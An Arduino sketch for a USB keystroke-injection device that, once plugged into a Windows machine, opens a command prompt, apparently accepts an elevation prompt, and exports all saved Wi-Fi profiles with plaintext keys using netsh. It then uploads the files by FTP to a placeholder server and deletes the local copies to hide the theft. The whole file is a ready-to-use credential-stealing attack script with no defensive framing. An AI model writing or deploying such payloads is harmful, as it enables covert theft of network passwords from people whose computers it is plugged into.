#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press("r");
  Keyboard.releaseAll();

  delay(300);
  Keyboard.print(F("cmd"));

  delay(300);
  typeKey(KEY_RETURN);

  delay(300);
  typeKey(KEY_LEFT_ARROW);

  delay(100);
  typeKey(KEY_RETURN);

  delay(300);
  Keyboard.print(F("cd C:\\"));

  typeKey(KEY_RETURN);

  delay(100);
  Keyboard.print(F("md l"));

  typeKey(KEY_RETURN);

  delay(100);
  Keyboard.print(F("cd l && @netsh wlan export profile key=clear >nul"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("ftp -i <ftpip>"));

  typeKey(KEY_RETURN);

  delay(1200);
  Keyboard.print(F("<ftpuname>"));

  delay(70);
  typeKey(KEY_RETURN);
  
  delay(1200);
  Keyboard.print(F("<ftppass>"));

  delay(70);
  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.print(F("cd wlan"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("mput C:\\l\\*.xml"));

  typeKey(KEY_RETURN);

  delay(3000);
  Keyboard.print(F("bye"));

  typeKey(KEY_RETURN);

  delay(200);
  Keyboard.print(F("cd .."));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("del \"C:\\l\""));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("j"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("exit"));

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
